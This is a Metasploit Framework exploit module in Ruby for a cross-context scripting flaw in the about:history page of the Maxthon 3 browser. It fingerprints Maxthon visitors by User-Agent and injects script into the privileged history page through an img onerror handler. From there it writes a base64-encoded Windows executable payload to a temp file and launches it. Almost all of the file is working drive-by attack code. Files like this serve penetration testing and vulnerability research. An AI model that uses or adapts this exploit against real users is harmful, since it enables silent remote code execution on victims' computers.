# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##


require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Maxthon3 about:history XCS Trusted Zone Code Execution&#039;,
      &#039;Description&#039;    => %q{
        Cross Context Scripting (XCS) is possible in the Maxthon about:history page.
        Injection in such privileged/trusted browser zone can be used to modify
        configuration settings and execute arbitrary commands.

        Please note this module only works against specific versions of XCS. Currently,
        we&#039;ve only successfully tested on Maxthon 3.1.7 build 600 up to 3.2.2 build 1000.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Roberto Suggi Liverani&#039;, # Discovered the vulnerability and developed msf module
          &#039;sinn3r&#039;, # msf module
          &#039;juan vazquez&#039; # msf module
        ],
      &#039;References&#039; =>
        [
          [&#039;URL&#039;, &#039;http://blog.malerisch.net/2012/12/maxthon-cross-context-scripting-xcs-about-history-rce.html&#039;]
        ],
      &#039;Payload&#039; =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039; =>
        [
          [&#039;Maxthon 3 (prior to 3.3) on Windows&#039;, {} ]
        ],
      &#039;DisclosureDate&#039; => &#039;Nov 26 2012&#039;,
      &#039;DefaultTarget&#039;  => 0
    ))
  end

  def on_request_uri(cli, request)
    if request.headers[&#039;User-agent&#039;] !~ /Maxthon\/3/ or request.headers[&#039;User-agent&#039;] !~ /AppleWebKit\/534.12/
      print_status("Sending 404 for User-Agent #{request.headers[&#039;User-agent&#039;]}")
      send_not_found(cli)
      return
    end

    html_hdr = %Q|
    <html>
    <head>
    <title>Loading</title>
    |

    html_ftr = %Q|
    </head>
    <body >
    <h1>Loading</h1>
    </body></html>
    |

    case request.uri
      when /\?jspayload/
        p = regenerate_payload(cli)
        if (p.nil?)
          send_not_found(cli)
          return
        end
        # We&#039;re going to run this through unescape(), so make sure
        # everything is encoded
        penc = generate_payload_exe
        penc2 = Rex::Text.encode_base64(penc)

        # now this is base64 encoded payload which needs to be passed to the file write api in maxthon.
        # Then file can be launched via Program DOM API, because of this only Maxthon 3.1 versions are targeted.
        # The Program DOM API isn&#039;t available on Maxthon 3.2 and upper versions.
        content = %Q|
        if(maxthon.program)
        {
        var fileTemp = new maxthon.io.File.createTempFile("test","exe");
        var fileObj = maxthon.io.File(fileTemp);
        maxthon.io.FileWriter(fileTemp);
        maxthon.io.writeDataURL("data:application/x-msdownload;base64,#{penc2}");
        maxthon.program.Program.launch(fileTemp.name_,"C:");
        }
        |

      when /\?history/
        js = %Q|
        window.onload = function() {
          location.href = "about:history";
        }
        |

        content = %Q|
        #{html_hdr}
        <script>
        #{js}
        </script>
        #{html_ftr}
        |

      when get_resource()
        print_status("Sending #{self.name} payload for request #{request.uri}")

        js = %Q|
        url = location.href;
        url2 = url + "?jspayload=1";
        inj = "?history#%22/><img src=a onerror=%22"
        inj_1 = "a=document.createElement(&#039;script&#039;);a.setAttribute(&#039;src&#039;,&#039;"+url2+"&#039;);document.body.appendChild(a);";
        window.location = unescape(inj) + inj_1;
        |

        content = %Q|
        #{html_hdr}
        <script>
        #{js}
        </script>
        #{html_ftr}
        |
      else
        print_status("Sending 404 for request #{request.uri}")
        send_not_found(cli)
        return
    end

    send_response_html(cli, content)
  end

end

